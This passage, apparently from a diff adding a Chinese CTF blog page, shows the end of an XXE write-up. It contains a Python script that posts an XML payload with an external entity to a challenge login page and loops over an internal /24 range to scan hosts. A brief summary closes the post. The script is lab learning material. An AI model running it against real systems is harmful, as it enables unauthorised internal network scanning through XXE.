class="string">&quot;http://1e7b147b-21c2-49b3-8798-c9d6581bf544.node4.buuoj.cn:81/doLogin.php&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 定义XML负载，包括外部实体引用</span></span><br><span class="line">Payload = <span class="string">&#x27;&lt;?xml version=&quot;1.0&quot;?&gt;&#x27;</span>\</span><br><span class="line">         <span class="string">&#x27;&lt;!DOCTYPE note [&#x27;</span>\</span><br><span class="line">         <span class="string">&#x27;&lt;!ENTITY admin SYSTEM &quot;http://10.244.81.&#123;&#125;&quot;&gt;&#x27;</span>\</span><br><span class="line">         <span class="string">&#x27;]&gt;&#x27;</span>\</span><br><span class="line">         <span class="string">&#x27;&lt;user&gt;&#x27;</span>\</span><br><span class="line">         <span class="string">&#x27;&lt;username&gt;&#x27;</span>\</span><br><span class="line">         <span class="string">&#x27;&amp;admin;&#x27;</span>\</span><br><span class="line">         <span class="string">&#x27;&lt;/username&gt;&#x27;</span>\</span><br><span class="line">         <span class="string">&#x27;&lt;password&gt;&#x27;</span>\</span><br><span class="line">         <span class="string">&#x27;123456&#x27;</span>\</span><br><span class="line">         <span class="string">&#x27;&lt;/password&gt;&#x27;</span>\</span><br><span class="line">         <span class="string">&#x27;&lt;/user&gt;&#x27;</span>\</span><br><span class="line"></span><br><span class="line"><span class="comment"># 循环从1到255，每次更改外部实体IP地址</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">256</span>):</span><br><span class="line">    payload = Payload.<span class="built_in">format</span>(i)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="comment"># 发送POST请求</span></span><br><span class="line">        resp = res.post(url, data=payload, timeout=<span class="number">0.2</span>)<span class="comment">#在这里两秒发一次包</span></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="comment"># 如果请求失败，打印失败信息</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;#&#123;&#125; =&gt; Request failed&quot;</span>.<span class="built_in">format</span>(i))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="comment"># 如果请求成功，打印响应</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;#&#123;&#125; =&gt; &#123;&#125;&quot;</span>.<span class="built_in">format</span>(i, resp.text))</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>这个时候我们大概几秒就跑出了flag</p>
+<p><img src="https://jxdgx.oss-cn-beijing.aliyuncs.com/test/image-20231030172946943.png" alt="image-20231030172946943"></p>
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>这是一个用xxe去扫描内网ip的一个题主要就是在上面一题的基础上更加帮助大家学习，如果想更深的学习还是要去多做一些这有关的题</p>
+
+    </div>
+  </article>
+  
+    <aside class="post-sidebar-toc">
+      <div class="post-sidebar-toc-inner">
+        <div class="post-sidebar-toc-title">Contents</div>
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#XML%E5%AE%9E%E4%BD%93%E6%B3%A8%E5%85%A5"><span class="toc-number">1.</span> <span class="toc-text">XML实体注入</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8E%9F%E7%90%86"><span class="toc-number">1.1.</span> <span class="toc-text">原理</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%89%8D%E8%A8%80%E4%BB%8B%E7%BB%8D"><span class="toc-number">1.2.</span> <span class="toc-text">前言介绍</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE%E9%93%BE%E6%8E%A5"><span class="toc-number">1.3.</span> <span class="toc-text">题目链接</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%A7%A3%E9%A2%98%E6%AD%A5%E9%AA%A4"><span class="toc-number">1.4.</span> <span class="toc-text">解题步骤</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%BB%E7%BB%93%EF%BC%9A"><span class="toc-number">1.5.</span> <span class="toc-text">总结：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE%E9%93%BE%E6%8E%A5-1"><span class="toc-number">1.6.</span> <span class="toc-text">题目链接</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%A7%A3%E9%A2%98%E6%AD%A5%E9%AA%A4-1"><span class="toc-number">1.7.</span> <span class="toc-text">解题步骤</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-number">1.8.</span> <span class="toc-text">总结</span></a></li></ol></li></ol>
+      </div>
+    </aside>
+  
+</div>
+
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">首页</a></li>
+        
+          <li><a href="/archives/">归档</a></li>
+        
+          <li><a href="/tags/">标签</a></li>
+        
+          <li><a href="/categories/">分类</a></li>
+        
+          <li><a href="/links/">links</a></li>
+        
+          <li><a href="/about/">关于</a></li>
+        
+      </ul>
+    </div>
+
+    
+    
+    
+      <div id="toc-footer" style="display: none">
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#XML%E5%AE%9E%E4%BD%93%E6%B3%A8%E5%85%A5"><span class="toc-number">1.</span> <span class="toc-text">XML实体注入</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8E%9F%E7%90%86"><span class="toc-number">1.1.</span> <span class="toc-text">原理</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%89%8D%E8%A8%80%E4%BB%8B%E7%BB%8D"><span class="toc-number">1.2.</span> <span class="toc-text">前言介绍</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE%E9%93%BE%E6%8E%A5"><span class="toc-number">1.3.</span> <span class="toc-text">题目链接</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%A7%A3%E9%A2%98%E6%AD%A5%E9%AA%A4"><span class="toc-number">1.4.</span> <span class="toc-text">解题步骤</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%BB%E7%BB%93%EF%BC%9A"><span class="toc-number">1.5.</span> <span class="toc-text">总结：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE%E9%93%BE%E6%8E%A5-1"><span class="toc-number">1.6.</span> <span class="toc-text">题目链接</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%A7%A3%E9%A2%98%E6%AD%A5%E9%AA%A4-1"><span class="toc-number">1.7.</span> <span class="toc-text">解题步骤</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-number">1.8.</span> <span class="toc-text">总结</span></a></li></ol></li></ol>
+      </div>
+    
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://dgxddd.github.io/2022/05/25/XML%E5%AE%9E%E4%BD%93%E6%B3%A8%E5%85%A5/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://dgxddd.github.io/2022/05/25/XML%E5%AE%9E%E4%BD%93%E6%B3%A8%E5%85%A5/&text=XML实体注入"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://dgxddd.github.io/2022/05/25/XML%E5%AE%9E%E4%BD%93%E6%B3%A8%E5%85%A5/&title=XML实体注入"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://dgxddd.github.io/2022/05/25/XML%E5%AE%9E%E4%BD%93%E6%B3%A8%E5%85%A5/&is_video=false&description=XML实体注入"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=XML实体注入&body=Check out this article: https://dgxddd.github.io/2022/05/25/XML%E5%AE%9E%E4%BD%93%E6%B3%A8%E5%85%A5/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://dgxddd.github.io/2022/05/25/XML%E5%AE%9E%E4%BD%93%E6%B3%A8%E5%85%A5/&title=XML实体注入"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://dgxddd.github.io/2022/05/25/XML%E5%AE%9E%E4%BD%93%E6%B3%A8%E5%85%A5/&title=XML实体注入"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://dgxddd.github.io/2022/05/25/XML%E5%AE%9E%E4%BD%93%E6%B3%A8%E5%85%A5/&title=XML实体注入"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://dgxddd.github.io/2022/05/25/XML%E5%AE%9E%E4%BD%93%E6%B3%A8%E5%85%A5/&title=XML实体注入"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://dgxddd.github.io/2022/05/25/XML%E5%AE%9E%E4%BD%93%E6%B3%A8%E5%85%A5/&name=XML实体注入&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://dgxddd.github.io/2022/05/25/XML%E5%AE%9E%E4%BD%93%E6%B3%A8%E5%85%A5/&t=XML实体注入"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> 菜单</a>
+        
+          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> 目录</a>
+        
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> 分享</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> 返回顶部</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2016-2026
+    jxdgx
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">首页</a></li><!--
+     --><!--
+       --><li><a href="/archives/">归档</a></li><!--
+     --><!--
+       --><li><a href="/tags/">标签</a></li><!--
+     --><!--
+       --><li><a href="/categories/">分类</a></li><!--
+     --><!--
+       --><li><a href="/links/">links</a></li><!--
+     --><!--
+       --><li><a href="/about/">关于</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+<link rel="stylesheet" href="/css/custom.css">
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"复制到粘贴板！\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "复制成功！");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<script src="/js/custom.js"></script>
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+
+</body>
+</html>
